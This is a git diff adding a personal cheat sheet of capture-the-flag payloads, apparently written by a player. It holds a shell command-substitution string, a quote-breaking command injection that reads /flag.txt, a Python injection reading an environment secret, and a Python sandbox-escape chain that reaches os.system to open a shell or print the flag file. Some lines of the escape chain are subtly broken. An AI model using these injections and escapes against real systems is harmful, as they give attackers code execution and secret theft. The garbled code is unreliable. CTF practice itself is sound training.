@@ -1,0 +1,53 @@
+[GIT PEEK]
+
+1) Send "$(echo $FLAG)"
+
+
+[QRDROP]
+
+'; qrencode -t PNG -o /tmp/qrcodes/b7d6113e-2349-43ce-8578-44d1ea4f3927.png < /flag.txt #
+
+
+[SpreadSheetZero]
+
+1)capito dopo pare prove che il back-end è python
+=__import__('os').getenv('FLAG')
+
+
+[AUTOGRADE test]
+from GitHub repository --> https://github.com/yaklang/hack-skills/blob/main/skills/sandbox-escape-techniques/PYTHON_SANDBOX_ESCAPE.md
+
+# Start from any object literal
+().__class__                          # <class 'tuple'>
+().__class__.__bases__                # (<class 'object'>,)
+().__class__.__bases__[0]             # <class 'object'>
+().__class__.__bases__[0].__subclasses__()  # ALL loaded classes
+
+# Find useful subclass (index varies by Python version):
+# Look for: os._wrap_close, warnings.catch_warnings, subprocess.Popen
+# Example: find os._wrap_close
+for i, cls in enumerate(''.__class__.__bases__[0].__subclasses__()):
+    if 'wrap_close' in str(cls):
+        print(i, cls)
+        break
+
+# Access os.system via __init__.__globals__
+().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['system']('sh')
+#--------------------------------#
+obj=()
+obj_class=obj.class()
+root_of_python_objects=obj_class.__bases__[0] 
+list_of_classes=root_of_python_objects.__subclasses__()[141]
+invoke_the_constructor=list_of_classes.__init__
+list_functions_of_class=invoke_the_constructor.__globals__
+select_sys_function=invoke_the_constructor.__globals__[141]['system']('cat /flag.txt')
+
+().__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['system'](chr(111)+pen('/flag.txt'))
+
+
+
+
+#
+
+[VIRUS VAULT]
+Python script per time-based exfiltration
